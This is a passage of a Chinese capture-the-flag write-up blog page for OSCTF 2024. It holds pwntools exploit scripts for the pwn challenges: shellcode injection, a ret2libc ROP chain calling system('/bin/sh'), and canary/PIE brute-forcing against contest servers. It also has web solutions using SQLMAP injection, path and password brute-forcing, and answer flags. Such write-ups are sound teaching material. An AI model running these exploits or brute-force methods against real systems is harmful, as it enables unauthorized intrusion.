+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">sh = remote(&#x27;34.125.199.248&#x27;,1234)</span><br><span class="line"># sh = process(&quot;./vuln&quot;)</span><br><span class="line"></span><br><span class="line">ret_addr = 0x080481b2</span><br><span class="line"></span><br><span class="line"># 13</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">sh.recvuntil(&quot;Enter your shellcode:\n&quot;)</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"># pause()</span><br><span class="line">payload = p32(ret_addr)*26 + shellcode</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Lib-Riddle"><a href="#Lib-Riddle" class="headerlink" title="Lib Riddle"></a>Lib Riddle</h2><p>分析代码，由于 <code>0x100 &gt; 16</code>，存在缓冲区溢出漏洞。</p>
+<p>源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[16]; // [rsp+0h] [rbp-10h] BYREF</span><br><span class="line"></span><br><span class="line">  setbuf(_bss_start, 0LL);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  puts(&quot;Welcome to the library... What&#x27;s your name?&quot;);</span><br><span class="line">  read(0, buf, 0x100uLL);</span><br><span class="line">  puts(&quot;Hello there: &quot;);</span><br><span class="line">  puts(buf);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过运行 <code>ROPgadget</code>，我们在 <code>0x0401273</code> 处找到 <code>pop rdi</code>。但是，由于这是一个64位二进制文件，可能需要一个 <code>ret</code> gadget 进行堆栈对齐。<code>ret</code> gadget 在 <code>0x040101a</code>。</p>
+<p>通过使用 PLT 和 GOT 表，我们可以泄漏 <code>puts</code> 函数的地址。</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2lib/rop-leaking-libc-address">https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2lib/rop-leaking-libc-address</a></p>
+<p>我们通过逆向工程二进制文件并获取地址来找到 PLT 和 GOT 表的地址。</p>
+<p>利用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io=remote(&quot;34.125.199.248&quot;, 7809)</span><br><span class="line">pop_rdi=p64(0x0401273)</span><br><span class="line">puts_got=p64(0x0404018)</span><br><span class="line">puts_plt=p64(0x401060)</span><br><span class="line">ret=p64(0x040101a)</span><br><span class="line">start=p64(0x0401090)</span><br><span class="line">payload=&quot;A&quot;*24+pop_rdi+puts_got+puts_plt+start</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;?&quot;,payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.recv(42)</span><br><span class="line">libc=u64(io.recv(6)+2*&quot;\x00&quot;)</span><br><span class="line">libc=libc-0x84420</span><br><span class="line">system=p64(libc+0x52290)</span><br><span class="line">bin_sh=p64(libc+0x1b45bd)</span><br><span class="line"></span><br><span class="line">payload=&quot;A&quot;*24+ret+pop_rdi+bin_sh+system</span><br><span class="line">io.sendlineafter(&quot;?&quot;,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Coal-Mine-Canary"><a href="#Coal-Mine-Canary" class="headerlink" title="Coal Mine Canary"></a>Coal Mine Canary</h2><p>分析 <code>name_it</code> 函数，我们可以理解程序的工作原理。</p>
+<p>源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">int name_it()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp-Ch] [ebp-64h]</span><br><span class="line">  int v2; // [esp-8h] [ebp-60h]</span><br><span class="line">  int v3; // [esp-4h] [ebp-5Ch]</span><br><span class="line">  int v4; // [esp+0h] [ebp-58h] BYREF</span><br><span class="line">  char v5[32]; // [esp+4h] [ebp-54h] BYREF</span><br><span class="line">  char v6[32]; // [esp+24h] [ebp-34h] BYREF</span><br><span class="line">  int v7[2]; // [esp+44h] [ebp-14h] BYREF</span><br><span class="line">  int v8; // [esp+4Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v8 = 0;</span><br><span class="line">  v7[0] = global_birdy;</span><br><span class="line">  v7[1] = dword_804C050;</span><br><span class="line">  printf(&quot;How many letters should its name have?\n&gt; &quot;);</span><br><span class="line">  while ( v8 &lt;= 31 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;v5[v8], 1);</span><br><span class="line">    if ( v5[v8] == 10 )</span><br><span class="line">      break;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  __isoc99_sscanf(v5, &quot;%d&quot;, &amp;v4);</span><br><span class="line">  printf(&quot;And what&#x27;s the name? \n&gt; &quot;);</span><br><span class="line">  read(0, v6, v4);</span><br><span class="line">  if ( memcmp(v7, &amp;global_birdy, 8) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;*** Stack Smashing Detected *** : Are you messing with my canary?!&quot;);</span><br><span class="line">    exit(-1, v1, v2, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Ok... its name is %s\n&quot;);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该函数从文件中读取8字节的canary，如果canary发生变化，程序会崩溃。</p>
+<p>我们可以通过声明名字长度大于32字符并给自己取一个31字符的名字来泄露canary。这样做会泄露canary。</p>
+<p>原因是不应设置32字符，因为<code>read</code>函数会将换行符视为字符之一，因此如果是32字符会覆盖canary并导致程序崩溃。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Working in a coal mine is dangerous stuff.</span><br><span class="line">Good thing I&#x27;ve got my bird to protect me.</span><br><span class="line">Let&#x27;s give it a name.</span><br><span class="line">...</span><br><span class="line">How many letters should its name have?</span><br><span class="line">&gt; 33</span><br><span class="line">And what&#x27;s the name?</span><br><span class="line">&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Ok... its name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">NECGLSPQ</span><br></pre></td></tr></table></figure>
+
+<p>canary 是 <code>NECGLSPQ</code>。</p>
+<p>然而，这里是大多数人被卡住的地方。看起来很容易，只需覆盖返回地址并跳转到 <code>tweet_tweet</code>（即sin函数）。但实际情况是，该二进制文件启用了PIE…</p>
+<p>我做的是在不知道PIE存在的情况下暴力破解地址。</p>
+<p>利用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">for i in range(1024):</span><br><span class="line">    io=remote(&quot;34.125.199.248&quot;, 5674)</span><br><span class="line">    win=p32(0x08049259)</span><br><span class="line">    payload=&quot;A&quot;*32+&quot;NECGLSPQ&quot;+&quot;A&quot;*12+&quot;BBBB&quot;+p32(0x8049259+i)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">    io.sendline(&quot;300&quot;)</span><br><span class="line"></span><br><span class="line">    io.sendafter(&quot;&gt; &quot;,payload)</span><br><span class="line">    io.recvuntil(&quot;BBBB&quot;)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        print hex(u32(io.recv(4)))</span><br><span class="line">        print io.recvuntil(&quot;&#125;&quot;)</span><br><span class="line">    except:</span><br><span class="line">        print &quot;NONE&quot;</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Introspection"><a href="#Introspection" class="headerlink" title="Introspection"></a>Introspection</h2><p>F12看js一把梭</p>
+<p><img src="/images/migrated/18301878/10.png"></p>
+<p><strong>OSCTF{Cr4zY_In5P3c71On}</strong></p>
+<h2 id="Indoor-WebApp"><a href="#Indoor-WebApp" class="headerlink" title="Indoor WebApp"></a>Indoor WebApp</h2><p>进题点View Profile发现有参数，直接传个id为2就出了</p>
+<p><img src="https://bu.dusays.com/2024/07/14/66937cb7dcf9a.png" alt="image-20240714150959615.png"></p>
+<h2 id="Style-Query-Listing…"><a href="#Style-Query-Listing…" class="headerlink" title="Style Query Listing…?"></a>Style Query Listing…?</h2><p>SQLMAP一把梭了，就是国外比赛国内连接网络太拉跨，时间盲注老是挂</p>
+<p><img src="/images/migrated/18301878/12.jpg"></p>
+<p>就搞出来一个tables</p>
+<p><img src="/images/migrated/18301878/13.jpg"></p>
+<p>索性爆破看看有什么吧，发现有&#x2F;admin路由，进去看看</p>
+<p><img src="/images/migrated/18301878/14.png"></p>
+<p>此时的我：？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p>
+<p>应该是忘记设置权限了（大雾）</p>
+<p><strong>OSCTF{D1r3ct0RY_BrU7t1nG_4nD_SQL}</strong></p>
+<h2 id="Heads-or-Tails"><a href="#Heads-or-Tails" class="headerlink" title="Heads or Tails?"></a>Heads or Tails?</h2><p>依照hint要求爆破，发现存在&#x2F;get-flag</p>
+<p><img src="/images/migrated/18301878/15.jpg"></p>
+<p>Burp连一下</p>
+<p><img src="/images/migrated/18301878/16.jpg"></p>
+<p>发现支持HEAD和OPTIONS方法</p>
+<p>发送HEAD请求包得到flag</p>
+<p><strong>OSCTF{Und3Rr47Ed_H3aD_M3Th0D}</strong></p>
+<h2 id="Action-Notes"><a href="#Action-Notes" class="headerlink" title="Action Notes"></a>Action Notes</h2><p>谁都没有想到啊，谁都没有想到啊。这题居然是弱密码。。。。</p>
+<p>对着admin账户一通爆破出弱密码admin123，直接登录即可</p>
+<p><img src="/images/migrated/18301878/17.png"></p>
+<p><strong>OSCTF{Av0id_S1mpl3_P4ssw0rDs}</strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">1.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Secret-Message"><span class="toc-number">1.1.</span> <span class="toc-text">The Secret Message</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Couple-Primesc"><span class="toc-number">1.2.</span> <span class="toc-text">Couple Primesc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Efficient-RSA"><span class="toc-number">1.3.</span> <span class="toc-text">Efficient RSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Love-Story"><span class="toc-number">1.4.</span> <span class="toc-text">Love Story</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cipher-Conundrum"><span class="toc-number">1.5.</span> <span class="toc-text">Cipher Conundrum</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Gophers-Language"><span class="toc-number">2.1.</span> <span class="toc-text">Gophers Language</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Another-Python-Game"><span class="toc-number">2.2.</span> <span class="toc-text">Another Python Game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Broken-Sword"><span class="toc-number">2.3.</span> <span class="toc-text">The Broken Sword</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Avengers-Assemble"><span class="toc-number">2.4.</span> <span class="toc-text">Avengers Assemble</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Leaky-Pipes"><span class="toc-number">3.1.</span> <span class="toc-text">Leaky Pipes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-Buffet"><span class="toc-number">3.2.</span> <span class="toc-text">Buffer Buffet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Byte-Breakup"><span class="toc-number">3.3.</span> <span class="toc-text">Byte Breakup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#seed-sPRING"><span class="toc-number">3.4.</span> <span class="toc-text">seed sPRING</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ShellMischief"><span class="toc-number">3.5.</span> <span class="toc-text">ShellMischief</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lib-Riddle"><span class="toc-number">3.6.</span> <span class="toc-text">Lib Riddle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Coal-Mine-Canary"><span class="toc-number">3.7.</span> <span class="toc-text">Coal Mine Canary</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">4.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introspection"><span class="toc-number">4.1.</span> <span class="toc-text">Introspection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Indoor-WebApp"><span class="toc-number">4.2.</span> <span class="toc-text">Indoor WebApp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Style-Query-Listing%E2%80%A6"><span class="toc-number">4.3.</span> <span class="toc-text">Style Query Listing…?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Heads-or-Tails"><span class="toc-number">4.4.</span> <span class="toc-text">Heads or Tails?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Action-Notes"><span class="toc-number">4.5.</span> <span class="toc-text">Action Notes</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&text=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&title=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&is_video=false&description=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)&body=Check out this article: https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&title=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&title=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&title=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&title=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&name=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-07-14-osctf-2024-eics1-wp-web-reverse-pwn-cry/&t=OSCTF 2024 EICS1 WP (web, reverse, pwn 全解，cry部分)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
